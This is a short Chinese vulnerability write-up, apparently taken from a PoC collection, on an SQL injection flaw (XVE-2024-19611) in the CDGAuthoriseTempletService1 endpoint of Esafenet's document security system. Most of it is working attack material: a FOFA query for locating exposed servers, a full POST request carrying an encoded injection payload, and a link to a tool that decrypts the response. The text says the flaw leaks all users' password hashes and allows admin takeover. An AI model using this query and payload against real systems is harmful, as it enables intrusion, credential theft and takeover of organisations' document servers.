# 亿赛通电子文档安全管理系统CDGAuthoriseTempletService1存在SQL注入漏洞(XVE-2024-19611)

亿赛通电子文档安全管理系统的 CDGAuthoriseTempletService1 接口存在 SQL 注入漏洞。 攻击者可以通过构造特定的 POST 请求注入恶意 SQL 代码，利用该漏洞对数据库执行任意 SQL 操作，获取所有用户的账户密码信息，破解md5值后可直接接管后台，导致系统处于极不安全的状态。

## fofa

```java
body="/CDGServer3/index.jsp"
```

## poc

```xml
POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
Host: 
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 
CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDAKIPEINHHOFBOHLPEJBPJBKJLDDEIFOGLGHKANECEEGNDCNMJNLNJBFKNGKKJFODMFEKBOGFNDNJMCMHOFJBLGHEBALFGNNGLPBMKHHHGNKNHJGLFLODDIKAAOOOAJAEMBLBNMGOFJELPABKOEGMFLIBGPMHJPEJCKFBGHHNGMDAJBKBNNMIMFELPGEHDFGNHMBLEIKMINOAOAINBLEOIGHAMOPDNOIFFEFLGBFOFAGACH
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091052010.png)

使用 https://github.com/wafinfo/DecryptTools 工具解密

![image-20240809105347541](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091053589.png)